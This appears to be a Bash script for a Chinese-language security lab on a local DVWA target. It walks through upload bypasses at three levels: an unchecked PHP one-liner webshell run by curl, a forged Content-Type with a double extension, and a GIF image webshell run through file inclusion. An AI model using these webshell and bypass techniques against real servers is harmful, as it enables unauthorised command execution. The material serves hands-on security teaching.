#!/usr/bin/env bash
# =============================================================================
# 16 · 文件上传与 Webshell —— low/medium/high 三类校验绕过 + 一句话木马执行
# 用法: ./upload_lab.sh [apply|observe|clean|all]   (默认 all)
# 前置: 实验 12 的 DVWA 栈（本脚本自动拉起）
# =============================================================================
set -euo pipefail
cd "$(dirname "$0")"

PY="${PYTHON:-python3}"
ART="artifacts"
BASE="http://127.0.0.1:8080"
UP_DIR="../12_dvwa/artifacts/dvwa/hackable/uploads"
SHELLS=("shell.php" "shell.php.jpg" "shell.jpg")

step() { echo; echo "=====> [$1] $2"; }
ok()   { echo "  ✅ $*"; }
die()  { echo "  ❌ $*" >&2; exit 1; }

clean_shells() {
    local f
    for f in "${SHELLS[@]}"; do rm -f "$UP_DIR/$f"; done
}

do_apply() {
    step "apply" "拉起 DVWA + 生成三种 payload + 登录取会话"
    mkdir -p "$ART"
    ../12_dvwa/dvwa.sh apply | tail -2
    clean_shells                                   # 清掉上次残留，保证可复现
    "$PY" upload_lab.py gen
    "$PY" upload_lab.py session --level low > "$ART/cookie-low.txt"
    grep -q "PHPSESSID" "$ART/cookie-low.txt" || die "登录取会话失败"
    ok "上传点就绪：${BASE}/vulnerabilities/upload/（low 会话已备给文件包含用）"
}

do_observe() {
    local out
    step "observe" "① low：无任何校验——一句话木马直接落地并执行"
    "$PY" upload_lab.py upload --file "$ART/shell.php" | tee "$ART/up1.out"
    grep -q "上传成功" "$ART/up1.out" || die "low 上传失败"
    out="$(curl -s "${BASE}/hackable/uploads/shell.php?cmd=whoami")"
    echo "[curl] shell.php?cmd=whoami → ${out}"
    [ "$out" = "root" ] || die "一句话木马未执行（期望 root）"
    ok "low：上传即执行——curl 直接拿到执行用户 root（无需任何凭据）"

    step "observe" "② medium：只查客户端自报的 MIME——伪造 Content-Type 即过"
    "$PY" upload_lab.py upload --file "$ART/shell.php" --level medium --ctype image/jpeg \
        | tee "$ART/up2.out"
    grep -q "上传成功" "$ART/up2.out" || die "medium 伪造 MIME 失败"
    "$PY" upload_lab.py shell --url "${BASE}/hackable/uploads/shell.php" --cmd "id" \
        | tee "$ART/exec2.out"
    grep -q "uid=0" "$ART/exec2.out" || die "medium 上传的 shell 未执行"
    "$PY" upload_lab.py upload --file "$ART/shell.php.jpg" --level medium --ctype image/jpeg \
        | tee "$ART/up2b.out"
    grep -q "上传成功" "$ART/up2b.out" || die "双扩展名变换未通过 medium"
    ok "medium：改声明类型就过（查的是「你自称什么」）；双扩展名同样被接受——它不看扩展名"

    step "observe" "③ high：扩展名白名单 + 真图内容——图片马过检，文件包含执行"
    if "$PY" upload_lab.py upload --file "$ART/shell.php" --level high | tee "$ART/up3a.out"; then
        die "high 负对照失败：纯 php 竟然被接受"
    fi
    grep -q "被拒绝" "$ART/up3a.out" || die "high 负对照输出异常"
    echo "  ↳ 负对照：纯 php 被拒——白名单扩展名 + getimagesize 双重校验确实在拦"
    "$PY" upload_lab.py upload --file "$ART/shell.jpg" --level high | tee "$ART/up3b.out"
    grep -q "上传成功" "$ART/up3b.out" || die "GIF 图片马未通过 high"
    "$PY" upload_lab.py shell --url "${BASE}/vulnerabilities/fi/?page=../../hackable/uploads/shell.jpg" \
        --cmd "whoami" --cookie "$(cat "$ART/cookie-low.txt")"
    ok "high：GIF 图片马以 jpg 扩展名过检；文件包含把它当 PHP 执行——组合拳成立"
}

do_clean() {
    step "clean" "移除上传的木马并清理生成物（靶场保持运行）"
    clean_shells
    local f
    for f in "${SHELLS[@]}"; do
        [ -e "$UP_DIR/$f" ] && die "木马残留：$f"
    done
    rm -rf "$ART"
    ok "webshell 已移除、产物已清；靶场留着，要拆用 ../12_dvwa/dvwa.sh clean"
}

main() {
    local target="${1:-all}"
    case "$target" in
        apply)   do_apply ;;
        observe) do_observe ;;
        clean)   do_clean ;;
        all)     do_apply; do_observe; do_clean ;;
        *) echo "可用: apply | observe | clean | all" >&2; exit 1 ;;
    esac
}
main "$@"
